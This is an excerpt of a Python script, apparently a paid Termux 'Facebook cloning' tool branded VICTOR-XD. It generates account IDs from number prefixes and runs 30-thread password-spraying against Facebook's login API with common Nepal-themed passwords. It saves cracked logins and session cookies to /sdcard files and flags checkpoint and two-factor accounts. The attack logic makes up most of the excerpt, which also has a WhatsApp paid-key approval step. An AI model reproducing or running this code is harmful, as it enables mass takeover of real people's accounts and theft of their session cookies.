...
#SOURCE : BY ZAIN
#GITHUB  : https://github.com/THE-LEGEND-VIICTOR/cheshirecat/blob/main/cat.txt
#--------------------------------------------------------------------------#
...
os.system('xdg-open https://www.facebook.com/victorsimpman')
input(' [•] Press Enter ')
os.system('xdg-open https://chat.whatsapp.com/GSCQbSItjnhKo7WietpTh0')
...
logo=("""\
      ...
      `?888P'  d88' `?888P'  `?8b  `?8888P'd88'\033[92;1m XD
\033[1;37m----------------------------------------------
 [•] Author     :  VICTOR SIMPMAN
...
def pp():
	...
	try:
			...
			if ky in ck:
				...
				os.system('xdg-open https://wa.me/+9779745258738?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*VICTOR*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
	except requests.exceptions.ConnectionError:
		exit(f' [!] Check Your Internet Connection...!')
...
def menu():
		...
		#	os.system('xdg-open)
			if xd in ['1','01']:
				...
				os.system('xdg-open https://wa.me/qr/7KHXOXVEDSGEL1')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 9821,9862,9842,9819')
		...
		with tred(max_workers=30) as zain:
			...
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'nepal123','maya123','tamang1234','first1234','first@123','first12345','first@12','first@last','first@321','last123','kathmandu123','fisrtlast12345','i love nepal','firstlast','iloveyou']
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [VICTOR-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [VICTOR-OK] '+uid+' √ '+pas)
                        open('/sdcard/VICTOR-R-OK.txt','a').write(uid+'|'+pas+'\n')
                        open('/sdcard/VICTOR-R-COKI-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                        uid = str(po['error']['error_data']['uid'])
                        print(f'\r\r\x1b[38;5;205m [VICTOR-CP] '+uid+' | '+pas+'\033[1;97m')
                        open('/sdcard/VICTOR-R-CP.txt','a').write(uid+'|'+pas+'\n')
                        break
                else:
                    continue
        loop+=1
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/VICTOR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/VICTOR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[VICTOR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [VICTOR-CP] '+ids+' | '+pas+'\033[1;97m')
